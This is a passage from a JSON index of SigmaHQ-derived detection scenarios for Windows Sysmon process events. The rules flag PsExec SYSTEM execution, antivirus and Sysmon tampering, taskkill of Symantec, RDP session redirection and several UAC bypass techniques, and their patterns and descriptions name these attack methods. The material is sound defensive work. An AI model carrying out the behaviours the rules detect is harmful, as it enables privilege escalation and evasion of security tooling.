{"content": "type: trigger\nname: sigmahq/proc_creation_win_sysinternals_psexesvc_as_system\ndescription: |\n  Detects suspicious launch of the PSEXESVC service on this system and a sub process run as LOCAL_SYSTEM (-s), which means that someone remotely started a command on this system running it with highest privileges and not only the privileges of the login user account (e.g. the administrator account)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage == 'C:\\\\Windows\\\\PSEXESVC.exe' && (evt.Parsed.User contains 'AUTHORI' || evt.Parsed.User contains 'AUTORI'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"PsExec Service Child Process Execution as LOCAL SYSTEM\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious launch of the PSEXESVC service on this system and a sub process run as LOCAL_SYSTEM (-s), which means that someone remotely started a command on this system running it with highest privileges and not only the privileges of the login user account (e.g. the administrator account)\n", "path": "scenarios/sigmahq/proc_creation_win_sysinternals_psexesvc_as_system.yml", "version": "0.2", "versions": {"0.1": {"digest": "2ba2842c4bbe9237c9b0c4bed2c6751c70e9685a5e2ff77e86b63dad68041dd4"}, "0.2": {"digest": "abf7d47626749ba24b87ec58c055df1b8bfcfe079595817fcf364f64e36ecffd"}}}, "sigmahq/proc_creation_win_sysinternals_pssuspend_susp_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_sysinternals_pssuspend_susp_execution\ndescription: |\n  Detects suspicious execution of Sysinternals PsSuspend, where the utility is used to suspend critical processes such as AV or EDR to bypass defenses\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.OriginalFileName == 'pssuspend.exe' || evt.Parsed.Image endsWith '\\\\pssuspend.exe' || evt.Parsed.Image endsWith '\\\\pssuspend64.exe') && evt.Parsed.CommandLine contains 'msmpeng.exe')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1562.001\n\n  label: \"Sysinternals PsSuspend Suspicious Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious execution of Sysinternals PsSuspend, where the utility is used to suspend critical processes such as AV or EDR to bypass defenses\n", "path": "scenarios/sigmahq/proc_creation_win_sysinternals_pssuspend_susp_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "8328da1d4472411d65038c88c2b6e4a555ab8086e0897cee6e8ab32fa8ea8aa8"}, "0.2": {"digest": "7fd3e4bf5d1c4a664503f36d98e67a7b50f73f67fd1515a288998639780834aa"}}}, "sigmahq/proc_creation_win_sysinternals_sdelete": {"content": "type: trigger\nname: sigmahq/proc_creation_win_sysinternals_sdelete\ndescription: |\n  Detects the use of SDelete to erase a file not the free space\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.OriginalFileName == 'sdelete.exe' && not (evt.Parsed.CommandLine contains ' -h' || evt.Parsed.CommandLine contains ' -c' || evt.Parsed.CommandLine contains ' -z' || evt.Parsed.CommandLine contains ' /?'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1485\n\n  label: \"Potential File Overwrite Via Sysinternals SDelete\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of SDelete to erase a file not the free space\n", "path": "scenarios/sigmahq/proc_creation_win_sysinternals_sdelete.yml", "version": "0.2", "versions": {"0.1": {"digest": "b2ba8845e514a5371f71607275884698c0ed60ba8315a606fa2bc9466bd7db9e"}, "0.2": {"digest": "0e4b6b2ee05d4c84d69ca77d64e9d564cf03c3aba276ccef607ae4347687524a"}}}, "sigmahq/proc_creation_win_sysinternals_susp_psexec_paexec_flags": {"content": "type: trigger\nname: sigmahq/proc_creation_win_sysinternals_susp_psexec_paexec_flags\ndescription: |\n  Detects unknown program using commandline flags usually used by tools such as PsExec and PAExec to start programs with SYSTEM Privileges\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.CommandLine contains ' -s cmd' || evt.Parsed.CommandLine contains ' /s cmd' || evt.Parsed.CommandLine contains ' \u2013s cmd' || evt.Parsed.CommandLine contains ' \u2014s cmd' || evt.Parsed.CommandLine contains ' \u2015s cmd' || evt.Parsed.CommandLine contains ' -s -i cmd' || evt.Parsed.CommandLine contains ' -s /i cmd' || evt.Parsed.CommandLine contains ' -s \u2013i cmd' || evt.Parsed.CommandLine contains ' -s \u2014i cmd' || evt.Parsed.CommandLine contains ' -s \u2015i cmd' || evt.Parsed.CommandLine contains ' /s -i cmd' || evt.Parsed.CommandLine contains ' /s /i cmd' || evt.Parsed.CommandLine contains ' /s \u2013i cmd' || evt.Parsed.CommandLine contains ' /s \u2014i cmd' || evt.Parsed.CommandLine contains ' /s \u2015i cmd' || evt.Parsed.CommandLine contains ' \u2013s -i cmd' || evt.Parsed.CommandLine contains ' \u2013s /i cmd' || evt.Parsed.CommandLine contains ' \u2013s \u2013i cmd' || evt.Parsed.CommandLine contains ' \u2013s \u2014i cmd' || evt.Parsed.CommandLine contains ' \u2013s \u2015i cmd' || evt.Parsed.CommandLine contains ' \u2014s -i cmd' || evt.Parsed.CommandLine contains ' \u2014s /i cmd' || evt.Parsed.CommandLine contains ' \u2014s \u2013i cmd' || evt.Parsed.CommandLine contains ' \u2014s \u2014i cmd' || evt.Parsed.CommandLine contains ' \u2014s \u2015i cmd' || evt.Parsed.CommandLine contains ' \u2015s -i cmd' || evt.Parsed.CommandLine contains ' \u2015s /i cmd' || evt.Parsed.CommandLine contains ' \u2015s \u2013i cmd' || evt.Parsed.CommandLine contains ' \u2015s \u2014i cmd' || evt.Parsed.CommandLine contains ' \u2015s \u2015i cmd' || evt.Parsed.CommandLine contains ' -i -s cmd' || evt.Parsed.CommandLine contains ' -i /s cmd' || evt.Parsed.CommandLine contains ' -i \u2013s cmd' || evt.Parsed.CommandLine contains ' -i \u2014s cmd' || evt.Parsed.CommandLine contains ' -i \u2015s cmd' || evt.Parsed.CommandLine contains ' /i -s cmd' || evt.Parsed.CommandLine contains ' /i /s cmd' || evt.Parsed.CommandLine contains ' /i \u2013s cmd' || evt.Parsed.CommandLine contains ' /i \u2014s cmd' || evt.Parsed.CommandLine contains ' /i \u2015s cmd' || evt.Parsed.CommandLine contains ' \u2013i -s cmd' || evt.Parsed.CommandLine contains ' \u2013i /s cmd' || evt.Parsed.CommandLine contains ' \u2013i \u2013s cmd' || evt.Parsed.CommandLine contains ' \u2013i \u2014s cmd' || evt.Parsed.CommandLine contains ' \u2013i \u2015s cmd' || evt.Parsed.CommandLine contains ' \u2014i -s cmd' || evt.Parsed.CommandLine contains ' \u2014i /s cmd' || evt.Parsed.CommandLine contains ' \u2014i \u2013s cmd' || evt.Parsed.CommandLine contains ' \u2014i \u2014s cmd' || evt.Parsed.CommandLine contains ' \u2014i \u2015s cmd' || evt.Parsed.CommandLine contains ' \u2015i -s cmd' || evt.Parsed.CommandLine contains ' \u2015i /s cmd' || evt.Parsed.CommandLine contains ' \u2015i \u2013s cmd' || evt.Parsed.CommandLine contains ' \u2015i \u2014s cmd' || evt.Parsed.CommandLine contains ' \u2015i \u2015s cmd' || evt.Parsed.CommandLine contains ' -s pwsh' || evt.Parsed.CommandLine contains ' /s pwsh' || evt.Parsed.CommandLine contains ' \u2013s pwsh' || evt.Parsed.CommandLine contains ' \u2014s pwsh' || evt.Parsed.CommandLine contains ' \u2015s pwsh' || evt.Parsed.CommandLine contains ' -s -i pwsh' || evt.Parsed.CommandLine contains ' -s /i pwsh' || evt.Parsed.CommandLine contains ' -s \u2013i pwsh' || evt.Parsed.CommandLine contains ' -s \u2014i pwsh' || evt.Parsed.CommandLine contains ' -s \u2015i pwsh' || evt.Parsed.CommandLine contains ' /s -i pwsh' || evt.Parsed.CommandLine contains ' /s /i pwsh' || evt.Parsed.CommandLine contains ' /s \u2013i pwsh' || evt.Parsed.CommandLine contains ' /s \u2014i pwsh' || evt.Parsed.CommandLine contains ' /s \u2015i pwsh' || evt.Parsed.CommandLine contains ' \u2013s -i pwsh' || evt.Parsed.CommandLine contains ' \u2013s /i pwsh' || evt.Parsed.CommandLine contains ' \u2013s \u2013i pwsh' || evt.Parsed.CommandLine contains ' \u2013s \u2014i pwsh' || evt.Parsed.CommandLine contains ' \u2013s \u2015i pwsh' || evt.Parsed.CommandLine contains ' \u2014s -i pwsh' || evt.Parsed.CommandLine contains ' \u2014s /i pwsh' || evt.Parsed.CommandLine contains ' \u2014s \u2013i pwsh' || evt.Parsed.CommandLine contains ' \u2014s \u2014i pwsh' || evt.Parsed.CommandLine contains ' \u2014s \u2015i pwsh' || evt.Parsed.CommandLine contains ' \u2015s -i pwsh' || evt.Parsed.CommandLine contains ' \u2015s /i pwsh' || evt.Parsed.CommandLine contains ' \u2015s \u2013i pwsh' || evt.Parsed.CommandLine contains ' \u2015s \u2014i pwsh' || evt.Parsed.CommandLine contains ' \u2015s \u2015i pwsh' || evt.Parsed.CommandLine contains ' -i -s pwsh' || evt.Parsed.CommandLine contains ' -i /s pwsh' || evt.Parsed.CommandLine contains ' -i \u2013s pwsh' || evt.Parsed.CommandLine contains ' -i \u2014s pwsh' || evt.Parsed.CommandLine contains ' -i \u2015s pwsh' || evt.Parsed.CommandLine contains ' /i -s pwsh' || evt.Parsed.CommandLine contains ' /i /s pwsh' || evt.Parsed.CommandLine contains ' /i \u2013s pwsh' || evt.Parsed.CommandLine contains ' /i \u2014s pwsh' || evt.Parsed.CommandLine contains ' /i \u2015s pwsh' || evt.Parsed.CommandLine contains ' \u2013i -s pwsh' || evt.Parsed.CommandLine contains ' \u2013i /s pwsh' || evt.Parsed.CommandLine contains ' \u2013i \u2013s pwsh' || evt.Parsed.CommandLine contains ' \u2013i \u2014s pwsh' || evt.Parsed.CommandLine contains ' \u2013i \u2015s pwsh' || evt.Parsed.CommandLine contains ' \u2014i -s pwsh' || evt.Parsed.CommandLine contains ' \u2014i /s pwsh' || evt.Parsed.CommandLine contains ' \u2014i \u2013s pwsh' || evt.Parsed.CommandLine contains ' \u2014i \u2014s pwsh' || evt.Parsed.CommandLine contains ' \u2014i \u2015s pwsh' || evt.Parsed.CommandLine contains ' \u2015i -s pwsh' || evt.Parsed.CommandLine contains ' \u2015i /s pwsh' || evt.Parsed.CommandLine contains ' \u2015i \u2013s pwsh' || evt.Parsed.CommandLine contains ' \u2015i \u2014s pwsh' || evt.Parsed.CommandLine contains ' \u2015i \u2015s pwsh' || evt.Parsed.CommandLine contains ' -s powershell' || evt.Parsed.CommandLine contains ' /s powershell' || evt.Parsed.CommandLine contains ' \u2013s powershell' || evt.Parsed.CommandLine contains ' \u2014s powershell' || evt.Parsed.CommandLine contains ' \u2015s powershell' || evt.Parsed.CommandLine contains ' -s -i powershell' || evt.Parsed.CommandLine contains ' -s /i powershell' || evt.Parsed.CommandLine contains ' -s \u2013i powershell' || evt.Parsed.CommandLine contains ' -s \u2014i powershell' || evt.Parsed.CommandLine contains ' -s \u2015i powershell' || evt.Parsed.CommandLine contains ' /s -i powershell' || evt.Parsed.CommandLine contains ' /s /i powershell' || evt.Parsed.CommandLine contains ' /s \u2013i powershell' || evt.Parsed.CommandLine contains ' /s \u2014i powershell' || evt.Parsed.CommandLine contains ' /s \u2015i powershell' || evt.Parsed.CommandLine contains ' \u2013s -i powershell' || evt.Parsed.CommandLine contains ' \u2013s /i powershell' || evt.Parsed.CommandLine contains ' \u2013s \u2013i powershell' || evt.Parsed.CommandLine contains ' \u2013s \u2014i powershell' || evt.Parsed.CommandLine contains ' \u2013s \u2015i powershell' || evt.Parsed.CommandLine contains ' \u2014s -i powershell' || evt.Parsed.CommandLine contains ' \u2014s /i powershell' || evt.Parsed.CommandLine contains ' \u2014s \u2013i powershell' || evt.Parsed.CommandLine contains ' \u2014s \u2014i powershell' || evt.Parsed.CommandLine contains ' \u2014s \u2015i powershell' || evt.Parsed.CommandLine contains ' \u2015s -i powershell' || evt.Parsed.CommandLine contains ' \u2015s /i powershell' || evt.Parsed.CommandLine contains ' \u2015s \u2013i powershell' || evt.Parsed.CommandLine contains ' \u2015s \u2014i powershell' || evt.Parsed.CommandLine contains ' \u2015s \u2015i powershell' || evt.Parsed.CommandLine contains ' -i -s powershell' || evt.Parsed.CommandLine contains ' -i /s powershell' || evt.Parsed.CommandLine contains ' -i \u2013s powershell' || evt.Parsed.CommandLine contains ' -i \u2014s powershell' || evt.Parsed.CommandLine contains ' -i \u2015s powershell' || evt.Parsed.CommandLine contains ' /i -s powershell' || evt.Parsed.CommandLine contains ' /i /s powershell' || evt.Parsed.CommandLine contains ' /i \u2013s powershell' || evt.Parsed.CommandLine contains ' /i \u2014s powershell' || evt.Parsed.CommandLine contains ' /i \u2015s powershell' || evt.Parsed.CommandLine contains ' \u2013i -s powershell' || evt.Parsed.CommandLine contains ' \u2013i /s powershell' || evt.Parsed.CommandLine contains ' \u2013i \u2013s powershell' || evt.Parsed.CommandLine contains ' \u2013i \u2014s powershell' || evt.Parsed.CommandLine contains ' \u2013i \u2015s powershell' || evt.Parsed.CommandLine contains ' \u2014i -s powershell' || evt.Parsed.CommandLine contains ' \u2014i /s powershell' || evt.Parsed.CommandLine contains ' \u2014i \u2013s powershell' || evt.Parsed.CommandLine contains ' \u2014i \u2014s powershell' || evt.Parsed.CommandLine contains ' \u2014i \u2015s powershell' || evt.Parsed.CommandLine contains ' \u2015i -s powershell' || evt.Parsed.CommandLine contains ' \u2015i /s powershell' || evt.Parsed.CommandLine contains ' \u2015i \u2013s powershell' || evt.Parsed.CommandLine contains ' \u2015i \u2014s powershell' || evt.Parsed.CommandLine contains ' \u2015i \u2015s powershell') && not (evt.Parsed.CommandLine contains 'paexec' || evt.Parsed.CommandLine contains 'PsExec' || evt.Parsed.CommandLine contains 'accepteula'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1587.001\n\n  label: \"Potential Privilege Escalation To LOCAL SYSTEM\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects unknown program using commandline flags usually used by tools such as PsExec and PAExec to start programs with SYSTEM Privileges\n", "path": "scenarios/sigmahq/proc_creation_win_sysinternals_susp_psexec_paexec_flags.yml", "version": "0.2", "versions": {"0.1": {"digest": "230ac12c46c8a6113d5dae0cb63af9c8a8331e53be37898e16d95ec2a09e34a4"}, "0.2": {"digest": "93d6d2e0a556a903d4d7e5bbf307c2bfa15d558316102e74d23b189501fdc279"}}}, "sigmahq/proc_creation_win_sysinternals_sysmon_uninstall": {"content": "type: trigger\nname: sigmahq/proc_creation_win_sysinternals_sysmon_uninstall\ndescription: |\n  Detects the removal of Sysmon, which could be a potential attempt at defense evasion\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\Sysmon64.exe' || evt.Parsed.Image endsWith '\\\\Sysmon.exe' || evt.Parsed.Description == 'System activity monitor') && (evt.Parsed.CommandLine contains '-u' || evt.Parsed.CommandLine contains '/u' || evt.Parsed.CommandLine contains '\u2013u' || evt.Parsed.CommandLine contains '\u2014u' || evt.Parsed.CommandLine contains '\u2015u'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1562.001\n\n  label: \"Uninstall Sysinternals Sysmon\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the removal of Sysmon, which could be a potential attempt at defense evasion\n", "path": "scenarios/sigmahq/proc_creation_win_sysinternals_sysmon_uninstall.yml", "version": "0.2", "versions": {"0.1": {"digest": "5d8fc64fa9c4b55bb695d4e3407ea1bc901051ad7104c3c4cfc1eb9c9d43b7a1"}, "0.2": {"digest": "908daaf9c8e52448a87c55a8ff076cb5543c2193f6831faacb22125872accbe5"}}}, "sigmahq/proc_creation_win_systemsettingsadminflows_turn_on_dev_features": {"content": "type: trigger\nname: sigmahq/proc_creation_win_systemsettingsadminflows_turn_on_dev_features\ndescription: |\n  Detects when a user enable developer features such as \"Developer Mode\" or \"Application Sideloading\". Which allows the user to install untrusted packages.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\SystemSettingsAdminFlows.exe' || evt.Parsed.OriginalFileName == 'SystemSettingsAdminFlows.EXE') && evt.Parsed.CommandLine contains 'TurnOnDeveloperFeatures' && (evt.Parsed.CommandLine contains 'DeveloperUnlock' || evt.Parsed.CommandLine contains 'EnableSideloading'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"Potential Signing Bypass Via Windows Developer Features\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects when a user enable developer features such as \"Developer Mode\" or \"Application Sideloading\". Which allows the user to install untrusted packages.\n", "path": "scenarios/sigmahq/proc_creation_win_systemsettingsadminflows_turn_on_dev_features.yml", "version": "0.2", "versions": {"0.1": {"digest": "c1749bcc2f9fde71bb0d3ce7d61d57481d9d6dbd98f6a5d5fa21f7d771312a5c"}, "0.2": {"digest": "c7f6a09216ceae7eb2a09c6514bdea84c49c395ae7fad5bc1acd78b34a271d7d"}}}, "sigmahq/proc_creation_win_taskkill_sep": {"content": "type: trigger\nname: sigmahq/proc_creation_win_taskkill_sep\ndescription: |\n  Detects one of the possible scenarios for disabling Symantec Endpoint Protection. Symantec Endpoint Protection antivirus software services incorrectly implement the protected service mechanism. As a result, the NT AUTHORITY/SYSTEM user can execute the taskkill /im command several times ccSvcHst.exe /f, thereby killing the process belonging to the service, and thus shutting down the service. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'taskkill' && evt.Parsed.CommandLine contains ' /F ' && evt.Parsed.CommandLine contains ' /IM ' && evt.Parsed.CommandLine contains 'ccSvcHst.exe')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1562.001\n\n  label: \"Taskkill Symantec Endpoint Protection\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects one of the possible scenarios for disabling Symantec Endpoint Protection. Symantec Endpoint Protection antivirus software services incorrectly implement the protected service mechanism. As a result, the NT AUTHORITY/SYSTEM user can execute the taskkill /im command several times ccSvcHst.exe /f, thereby killing the process belonging to the service, and thus shutting down the service. \n", "path": "scenarios/sigmahq/proc_creation_win_taskkill_sep.yml", "version": "0.2", "versions": {"0.1": {"digest": "50739518921b1ea0607e158749f63ac581f50d396912fb357a4e1397cad9d2ae"}, "0.2": {"digest": "e91987b81ec89dd6805282ada5a961329af72d472f309287bc8ef02643a72983"}}}, "sigmahq/proc_creation_win_taskmgr_localsystem": {"content": "type: trigger\nname: sigmahq/proc_creation_win_taskmgr_localsystem\ndescription: |\n  Detects the creation of taskmgr.exe process in context of LOCAL_SYSTEM\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.User contains 'AUTHORI' || evt.Parsed.User contains 'AUTORI') && evt.Parsed.Image endsWith '\\\\taskmgr.exe')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1036\n\n  label: \"Taskmgr as LOCAL_SYSTEM\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the creation of taskmgr.exe process in context of LOCAL_SYSTEM\n", "path": "scenarios/sigmahq/proc_creation_win_taskmgr_localsystem.yml", "version": "0.2", "versions": {"0.1": {"digest": "9405b3de23ca125be9866f7818cd80596fac88c7b8582a897f85699808f3df94"}, "0.2": {"digest": "84e380867d385ad3f4ecfdf6e9796a23f9b76709dfec7391d22dd953be3887f3"}}}, "sigmahq/proc_creation_win_tscon_localsystem": {"content": "type: trigger\nname: sigmahq/proc_creation_win_tscon_localsystem\ndescription: |\n  Detects a tscon.exe start as LOCAL SYSTEM\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.User contains 'AUTHORI' || evt.Parsed.User contains 'AUTORI') && evt.Parsed.Image endsWith '\\\\tscon.exe')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1219\n\n  label: \"Suspicious TSCON Start as SYSTEM\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a tscon.exe start as LOCAL SYSTEM\n", "path": "scenarios/sigmahq/proc_creation_win_tscon_localsystem.yml", "version": "0.2", "versions": {"0.1": {"digest": "f53c3d53ec2a2916eed5ba4bcb44548486b5fa96e31532fe350a5917969c2328"}, "0.2": {"digest": "083e20277a5ffb72ce1939c0da133177565328b569525ba1df9ec1fd60dc66c7"}}}, "sigmahq/proc_creation_win_tscon_rdp_redirect": {"content": "type: trigger\nname: sigmahq/proc_creation_win_tscon_rdp_redirect\ndescription: |\n  Detects a suspicious RDP session redirect using tscon.exe\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains ' /dest:rdp-tcp#')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1563.002\n   - attack.t1021.001\n\n  label: \"Suspicious RDP Redirect Using TSCON\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a suspicious RDP session redirect using tscon.exe\n", "path": "scenarios/sigmahq/proc_creation_win_tscon_rdp_redirect.yml", "version": "0.2", "versions": {"0.1": {"digest": "bfdb226766cb2a3387df740e7a5e0de9b76ade5004ce30cd1031549eefd3d1cf"}, "0.2": {"digest": "421dc09bcfd322ad5f19c1b7fb182a0386b613c2a5a8053bbcc2957f54e95fd9"}}}, "sigmahq/proc_creation_win_uac_bypass_changepk_slui": {"content": "type: trigger\nname: sigmahq/proc_creation_win_uac_bypass_changepk_slui\ndescription: |\n  Detects an UAC bypass that uses changepk.exe and slui.exe (UACMe 61)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\changepk.exe' && evt.Parsed.ParentImage endsWith '\\\\slui.exe' && (evt.Parsed.IntegrityLevel in ['High', 'System']))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1548.002\n\n  label: \"UAC Bypass Using ChangePK and SLUI\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects an UAC bypass that uses changepk.exe and slui.exe (UACMe 61)\n", "path": "scenarios/sigmahq/proc_creation_win_uac_bypass_changepk_slui.yml", "version": "0.2", "versions": {"0.1": {"digest": "a23c65fd45c84fcb0a1be9f288f435b6c2af888d4caf4bf1077ec7e18c53d276"}, "0.2": {"digest": "01693e861ba93a2d2451c01524a84fd15d28cc3d2db1554f3feb8de9a482b754"}}}, "sigmahq/proc_creation_win_uac_bypass_cleanmgr": {"content": "type: trigger\nname: sigmahq/proc_creation_win_uac_bypass_cleanmgr\ndescription: |\n  Detects the pattern of UAC Bypass using scheduled tasks and variable expansion of cleanmgr.exe (UACMe 34)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine endsWith '\"\\\\system32\\\\cleanmgr.exe /autoclean /d C:' && evt.Parsed.ParentCommandLine == 'C:\\\\Windows\\\\system32\\\\svchost.exe -k netsvcs -p -s Schedule' && (evt.Parsed.IntegrityLevel in ['High', 'System']))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1548.002\n\n  label: \"UAC Bypass Using Disk Cleanup\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the pattern of UAC Bypass using scheduled tasks and variable expansion of cleanmgr.exe (UACMe 34)\n", "path": "scenarios/sigmahq/proc_creation_win_uac_bypass_cleanmgr.yml", "version": "0.2", "versions": {"0.1": {"digest": "e0edbea3675ffd7a363854a986863d072870a23d83bb108722242521d5fcc8f2"}, "0.2": {"digest": "43b6f21c5a1240f608ae9d3651a2b5442f12d7ba4a5f4d48fa55c6a1db85faf6"}}}, "sigmahq/proc_creation_win_uac_bypass_cmstp": {"content": "type: trigger\nname: sigmahq/proc_creation_win_uac_bypass_cmstp\ndescription: |\n  Detect commandline usage of Microsoft Connection Manager Profile Installer (cmstp.exe) to install specially formatted local .INF files\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\cmstp.exe' || evt.Parsed.OriginalFileName == 'CMSTP.EXE') && (evt.Parsed.CommandLine contains '/s' || evt.Parsed.CommandLine contains '-s' || evt.Parsed.CommandLine contains '/au' || evt.Parsed.CommandLine contains '-au' || evt.Parsed.CommandLine contains '/ni' || evt.Parsed.CommandLine contains '-ni'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1548.002\n   - attack.t1218.003\n\n  label: \"Bypass UAC via CMSTP\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detect commandline usage of Microsoft Connection Manager Profile Installer (cmstp.exe) to install specially formatted local .INF files\n", "path": "scenarios/sigmahq/proc_creation_win_uac_bypass_cmstp.yml", "version": "0.2", "versions": {"0.1": {"digest": "1222ae7fb1739913177c7d65211004b4c61efb0e4e71515b041914ce2043d621"}, "0.2": {"digest": "fd69c974384a611bd7c668de40062b8d697062630743b73b0d96214aca5fd13c"}}}, "sigmahq/proc_creation_win_uac_bypass_cmstp_com_object_access": {"content": "type: trigger\nname: sigmahq/proc_creation_win_uac_bypass_cmstp_com_object_access\ndescription: |\n  Detects UAC Bypass Attempt Using Microsoft Connection Manager Profile Installer Autoelevate-capable COM Objects (e.g. UACMe ID of 41, 43, 58 or 65)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\DllHost.exe' && (evt.Parsed.ParentCommandLine contains ' /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}' || evt.Parsed.ParentCommandLine contains ' /Processid:{3E000D72-A845-4CD9-BD83-80C07C3B881F}' || evt.Parsed.ParentCommandLine contains ' /Processid:{BD54C901-076B-434E-B6C7-17C531F4AB41}' || evt.Parsed.ParentCommandLine contains ' /Processid:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937}' || evt.Parsed.ParentCommandLine contains ' /Processid:{E9495B87-D950-4AB5-87A5-FF6D70BF3E90}') && (evt.Parsed.IntegrityLevel in ['High', 'System']))\nblackhole: 2m\n#status: stable\nlabels:\n  service: windows\n  confidence: 2\n  spoofable: 0\n  classification:\n   - attack.t1548.002\n   - attack.t1218.003\n\n  label: \"CMSTP UAC Bypass via COM Object Access\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects UAC Bypass Attempt Using Microsoft Connection Manager Profile Installer Autoelevate-capable COM Objects (e.g. UACMe ID of 41, 43, 58 or 65)\n", "path": "scenarios/sigmahq/proc_creation_win_uac_bypass_cmstp_com_object_access.yml", "version": "0.2", "versions": {"0.1": {"digest": "595741cbc1a28921122a925ae85ec36e23f127282ae0a9e738f03e7a6be16a84"}, "0.2": {"digest": "86618d7e5a98990ff2747ce834bc9c4c5a178836769b1d9e7d949ca9245f9468"}}}, "sigmahq/proc_creation_win_uac_bypass_computerdefaults": {"content": "type: trigger\nname: sigmahq/proc_creation_win_uac_bypass_computerdefaults\ndescription: |\n  Detects tools such as UACMe used to bypass UAC with computerdefaults.exe (UACMe 59)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.IntegrityLevel in ['High', 'System']) && evt.Parsed.Image == 'C:\\\\Windows\\\\System32\\\\ComputerDefaults.exe' && not (evt.Parsed.ParentImage contains ':\\\\Windows\\\\System32' || evt.Parsed.ParentImage contains ':\\\\Program Files'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1548.002\n\n  label: \"UAC Bypass Tools Using ComputerDefaults\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects tools such as UACMe used to bypass UAC with computerdefaults.exe 